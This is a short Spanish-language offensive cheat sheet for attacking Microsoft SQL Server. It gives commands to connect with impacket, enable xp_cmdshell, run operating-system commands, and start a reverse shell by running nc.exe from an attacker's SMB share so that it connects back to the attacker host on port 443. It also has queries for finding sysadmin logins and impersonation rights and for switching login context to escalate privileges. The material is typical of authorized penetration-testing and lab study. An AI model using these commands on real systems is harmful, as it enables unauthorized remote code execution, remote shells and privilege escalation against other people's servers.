Acceso a MSSQL

# Windows Server
impacket-mssqlclient <domain>/<user>@<ip_target> -windows-auth

Comandos para habilitar xp_cmdshell

help # Enumera comandos útiles
# Habilitar ejecución de comandos del sistema desde SQL Server
enable_xp_cmdshell 
# Alternativa
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; 
RECONFIGURE;-- 

# Ejecución de comandos
EXEC xp_cmdshell "whoami" 
# Reverse shell con SMB server desde Kali
EXEC xp_cmdshell "\\kali\smb\nc.exe kali 443 -e cmd"

# Ver usuario actual
select system_user; 
# Ver usuarios con rol administrador
select loginname from syslogins where sysadmin = 1; 
EXECUTE AS LOGIN = '<user>' # Cambiar de contexto de login

# Ver usuarios que permiten la suplantación de identidad
enum_impersonate
# Alternativa
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
